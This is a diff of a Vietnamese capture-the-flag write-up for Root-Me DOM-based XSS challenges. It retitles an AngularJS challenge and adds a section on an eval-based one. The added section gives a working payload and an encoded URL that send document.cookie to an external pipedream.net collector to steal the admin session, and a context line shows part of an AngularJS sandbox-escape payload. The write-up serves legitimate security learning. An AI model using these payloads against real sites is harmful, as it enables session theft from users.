@@ -111,8 +111,7 @@ Ta được flag trả về:
 > flag: rootme{XSS_D0M_BaSed_InTr0}
 
 
-## Chal 4: XSS 
-
+## Chal 4: XSS DOM Based - AngularJS
 ```
 Steal the admin’s session cookie.
 
@@ -159,3 +158,41 @@ http://challenge01.root-me.org/web-client/ch35/?name={{x=valueOf.name.constructo
 ![image](https://user-images.githubusercontent.com/104350480/218155614-d3be95db-d5b1-4df7-bcb3-a6e268a5df48.png)
 
 >Flag: rootme{@NGu1@R_J$_1$_C001}
+
+## Chall 5: XSS DOM Based - Eval
+
+```
+A bad practice ...
+Steal the admin’s session cookie.
+
+```
+
+Tiếp tục là chall về xss, bài này có liên quan đến hàm eval, ta cần nhập 1 phép tính, nếu kh sẽ kh thực hiện được
+
+![image](https://user-images.githubusercontent.com/104350480/218157778-248d5be0-644e-4639-890f-f89f81ae2434.png)
+
+![image](https://user-images.githubusercontent.com/104350480/218158292-9f278129-789a-4dc1-ba15-0082eea0a011.png)
+
+Xem qua source code thì có vẻ ta cần bypass qua hàm eval là xong chall này, ngoài ra kh thể sử dụng () vì đã bị liệt vào blacklist
+
+![image](https://user-images.githubusercontent.com/104350480/218158578-3ebbc272-495d-40f3-8ac6-77c79bcab51f.png)
+
+![image](https://user-images.githubusercontent.com/104350480/218159000-894d3387-bc3e-4591-938f-f50fcfb8993e.png)
+
+
+Mục tiêu đầu tiên vẫn phải là alert đã, nhưng có 1 cái ta có thể chú ý:
+
+![image](https://user-images.githubusercontent.com/104350480/218159511-3d90e8ec-bd2c-46e1-803e-be32a1c94d8b.png)
+
+Đúng vậy, regex chỉ yêu cầu 1 phép tính là được + - * / giữa 2 số là được, kh dùng được () nên tấn công luôn:
+
+```
+
+Payload: 1+1, document.location="https://eo7xxasp6lhfvaj.m.pipedream.net/?c="+document.cookie 
+Gửi qua contact: http://challenge01.root-me.org/web-client/ch34/?calculation=1%2B1%2C+document.location%3D%22https%3A%2F%2Feo7xxasp6lhfvaj.m.pipedream.net%2F%3Fc%3D%22%2Bdocument.cookie
+
+![image](https://user-images.githubusercontent.com/104350480/218165627-02281d8d-64fc-4ab1-9c1a-e0b6711aef66.png)
+
+```
+
+> Flag: rootme{Eval_Is_DangER0us}
